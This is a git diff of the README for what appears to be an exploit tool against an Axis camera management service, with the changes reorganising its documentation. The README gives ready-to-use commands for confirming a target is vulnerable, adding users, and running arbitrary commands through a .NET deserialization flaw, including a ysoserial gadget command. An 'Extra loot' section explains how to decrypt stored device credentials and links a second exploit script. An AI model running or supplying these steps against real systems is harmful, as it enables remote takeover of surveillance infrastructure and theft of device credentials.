@@ -13,7 +13,7 @@ It is based on Claroty's blog post ["Turning Camera Surveillance on its Axis"](h
 
 ## Usage
 
-```bash
+```
 python3 main.py --host <TARGET_IP> --key <CLIENT_PRIVATE_KEY.pem> [OPTIONS]
 ```
 
@@ -30,9 +30,20 @@ python3 main.py --host <TARGET_IP> --key <CLIENT_PRIVATE_KEY.pem> [OPTIONS]
 
 <br>
 
+### Requirements
+
+Install dependencies and generate an RSA private key in PEM format for the client:
+
+```bash
+pip install cryptography
+openssl genrsa -out client_priv.pem 2048
+```
+
+<br>
+
 ### Examples
 
-Query the product version:
+Query the product version to check the version is vulnerable:
 
 ```bash
 python3 main.py --host 192.168.1.197 --port 55752 --key client_priv.pem --version
@@ -51,7 +62,7 @@ python3 main.py --host 192.168.1.197 --port 55752 --key client_priv.pem --adduse
 
 ![img3](https://raw.githubusercontent.com/ricardojoserf/ricardojoserf.github.io/refs/heads/master/images/axis_rce/Screenshot_3.jpg)
 
-Send a custom Request from a file:
+Send a custom `Request` from a JSON file to execute any command:
 
 ```bash
 python3 main.py --host 192.168.1.197 --port 55752 --key client_priv.pem --json my_request.json
@@ -59,9 +70,9 @@ python3 main.py --host 192.168.1.197 --port 55752 --key client_priv.pem --json m
 
 <br>
 
-### Request file format
+### `Request` file format
 
-A Request is a JSON object with a single `Request` key. The format to exploit the deserialization is:
+A `Request` is a JSON object with a single "Request" key. The format to exploit the deserialization is:
 
 ```json
 {
@@ -82,7 +93,7 @@ A Request is a JSON object with a single `Request` key. The format to exploit th
 }
 ```
 
-The value of the `clientInformationDto` field can be obtained using Ysoserial.net with the gadget `WindowsIdentity`, which looks quite stable to exploit this vulnerability (other gadgets crash the service):
+The value of the `clientInformationDto` field can be obtained using Ysoserial.net with a gadget such as `WindowsIdentity`, which looks quite stable to exploit this vulnerability (other gadgets crash the service):
 
 ```
 ysoserial.exe -g WindowsIdentity -f Json.Net -c "ping -n 3 10.0.0.4" -o raw
@@ -94,14 +105,13 @@ ysoserial.exe -g WindowsIdentity -f Json.Net -c "ping -n 3 10.0.0.4" -o raw
 
 ## Extra loot
 
-Once you have access to the Windows machine, you have access to the `.FDB` databases which contain the credentials to connect to the different devices. These are encrypted using a weak AES implementation, which you can decrypt immediately using the host's volume serial number or brute-force it in minutes with a GPU. You can use the script in this repository to exploit it: [CVE-2026-63286](https://github.com/ricardojoserf/CVE-2026-63286).
+Once you have access to the Windows machine, you have access to the `.FDB` databases which contain the credentials to connect to the different devices. These are encrypted using a weak AES implementation, which you can decrypt immediately using the host's volume serial number or brute-force it in minutes with a GPU.
 
+You can use the script in this repository to exploit it: [CVE-2026-63286](https://github.com/ricardojoserf/CVE-2026-63286).
 
 <br>
 
 ---
-
-
 
 ## How the protocol works
 
@@ -130,23 +140,6 @@ TX  POST /_/<channelID>     ->  client AES key + IV  (wrapped)
 TX  POST /_/<channelID>     ->  HELLO (ClientId)
 TX  POST /_/<channelID>     ->  encrypted JSON Request
 RX  (server pushes)         <-  encrypted JSON Response
-```
-
-<br>
-
----
-
-
-## Requirements
-
-```bash
-pip install cryptography
-```
-
-You also need an RSA private key in PEM format for the client, which you can generate with:
-
-```bash
-openssl genrsa -out client_priv.pem 2048
 ```
 
 <br>
